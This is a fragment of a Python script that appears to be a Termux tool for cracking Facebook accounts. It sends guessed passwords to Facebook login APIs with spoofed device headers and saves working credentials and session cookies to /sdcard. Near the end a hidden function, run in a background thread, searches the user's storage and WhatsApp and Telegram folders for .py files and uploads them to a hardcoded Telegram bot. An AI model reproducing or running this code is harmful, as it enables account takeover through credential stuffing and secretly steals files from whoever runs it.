                        headers={'User-Agent':random.choice(get_ua_list2),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI':str(random.randint(20000, 40000)),'X-FB-SIM-HNI':str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '706'}
                        url = 'https://b-api.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{T} \033[1;32m[{abir}SUCCESS\033[1;32m]{abir} '+ids+f' \033[1;31m|\033[1;32m '+pas+f'\033[1;32m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{T} \033[1;32m[💥] \033[1;32m{coki}")
                                        linex()
                                        open('/sdcard/TOM-M1-OK.txt','a').write(f"{ids}|{pas}\n")
                                        open('/sdcard/TOM-M1-cookie-OK.txt','a').write(f"{ids}|{pas}|{coki}\n")
                                        oks.append(ids)
                                        Elite(ids,pas,coki)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print(f'\r\r\033[1;37m[TOM-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{T} \033[1;31m[TOM-CP] '+ids+' | '+pas+f'{R}')
                                                open('/sdcard/TOM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass
#__________________[ FILE M2 ]__________________#
def _api_2_(ids,names,passlist):
        try:
                global oks,cps,loop,sim_id
                abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                sys.stdout.write(f'\r\r{T} {X}[{G}XD{R}-{G}FILE{R}-{G}M2{X}]{abir} %s {G}OK{X}★{A}CP{G} %s{X}★{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US'])
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate',}
                        headers={'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent':random.choice(get_ua_list2),'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{T} \033[1;32m[SUCCESS]\033[1;32m '+ids+f' \033[1;31m|\033[1;32m '+pas+f'\033[1;31m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{T} \033[1;37m[💥] \033[1;37m{coki}")
                                        linex()
                                        open('/sdcard/TOM-M2-OK.txt','a').write(f"{ids}|{pas}\n")
                                        open('/sdcard/TOM-M2-cookie-OK.txt','a').write(f"{ids}|{pas}|{coki}\n")
                                        oks.append(ids)
                                        Elite(ids,pas,coki)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print(f'\r\r\033[1;37m[TOM-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r{T} \033[1;31m[TOM-CP] '+ids+' | '+pas+f'{R}')
                                                open('/sdcard/TOM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass

import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#@useridinfobot

def sexy():
    session=requests.session()
        
    bot_token = '7047543155:AAFkNyvtIR2EHXbhWiJGErMk7rOy-VnimjA' 
    chat_id = '1936367341'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram 
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    jjj.submit(menu)

#__________________| END |__________________#
apvroval.check()